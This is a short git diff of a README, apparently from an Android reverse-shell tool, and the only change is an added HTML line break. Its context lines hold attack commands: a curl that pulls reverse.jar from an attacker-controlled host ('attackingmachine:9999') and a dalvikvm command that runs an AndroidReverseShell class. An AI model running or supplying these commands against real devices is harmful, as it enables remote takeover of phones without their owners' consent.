@@ -22,7 +22,7 @@ Original Tutorial: https://malacupa.com/2018/10/25/android-command-line-reverse-
 
 You can just use DalvikVM bash script from Termux:
 
-`curl http://attackingmachine:9999/reverse.jar -o /sdcard/reverse.jar`
+`curl http://attackingmachine:9999/reverse.jar -o /sdcard/reverse.jar`<br/>
 `cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse.jar AndroidReverseShell`
 
 (pay attention to final "AndroidReverseShell" this must be same name used before, otherwise it fails!)
